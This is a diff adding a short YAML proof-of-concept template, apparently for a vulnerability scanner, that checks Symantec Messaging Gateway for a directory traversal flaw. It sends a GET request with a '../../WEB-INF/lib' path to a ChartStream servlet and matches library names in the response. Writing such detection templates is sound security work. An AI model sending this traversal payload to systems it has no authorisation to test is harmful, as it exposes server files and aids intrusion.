@@ -1,0 +1,16 @@
+id: poc-yaml-symantec-messaging-gateway-directory-traversal
+info:
+  name: Symantec Messaging Gateway 目录遍历漏洞
+  severity: high
+  tags:
+  - 目录遍历
+  finger: Symantec
+  osprey-id: vb_2022_0049
+requests:
+- method: GET
+  path: /brightmail/servlet/com.ve.kavachart.servlet.ChartStream?sn=../../WEB-INF/lib
+  expression: 'contains(body, "jakarta-commons") && contains(body, "sun-activation")
+
+    '
+variables: {}
+transport: http
